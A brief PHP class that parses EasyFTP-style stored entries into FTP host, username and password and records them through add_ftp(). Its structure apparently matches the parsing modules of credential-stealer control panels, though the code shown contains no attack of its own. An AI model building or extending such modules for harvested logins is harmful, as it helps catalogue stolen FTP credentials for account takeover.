<?php

class Module_easyftp extends Module_
{
    function ProcessEasy($Source)
    {
        if (substr($Source, 0, 2) != ',"')
            return;

        $Data = explode(",", trim($Source));
        if (is_array($Data) && count($Data) == 4)
        {
            $Host = Assign_(substr($Data[1], 1, -1));
            $User = Assign_(substr($Data[2], 1, -1));
            $Pass = Assign_(substr($Data[3], 1, -1));

            $this->add_ftp($Host, $User, $Pass);
        }
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessEasy($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
